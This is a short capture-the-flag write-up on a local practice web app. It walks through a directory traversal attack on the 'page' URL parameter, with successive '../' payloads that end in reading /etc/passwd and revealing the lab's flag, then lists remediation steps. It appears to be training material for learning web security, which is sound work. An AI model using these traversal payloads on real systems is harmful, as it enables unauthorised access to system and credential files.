When going to any page on the website we see that it's referenced with it's PHP path `http://localhost:8080/?page=member`, so we are going to try and find a breach around that.
We first try to add some random letters and see that we're given an alert box:

```
localhost:8080 says
Wtf ?
```

Let's try to navigate around the files and see what happens:
`http://localhost:8080/?page=member/../`:
```
localhost:8080 says
Wrong again ?
```

`http://localhost:8080/?page=member/../../../../`
```
localhost:8080 says
Almost.
```

`http://localhost:8080/?page=member/../../../../../../../`
```
localhost:8080 says
You can DO it !!!  :]
```

`http://localhost:8080/?page=member/../../../../../../../etc/passwd`

```
localhost:8080 says
Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 
```

We got our flag !

To remediate this vulnerability, the application should:
 - Implement proper input validation that rejects paths containing directory traversal sequences (like "../")
 - Use a whitelist approach to only allow specific, predefined pages to be included
 - Avoid directly passing user input to file system operations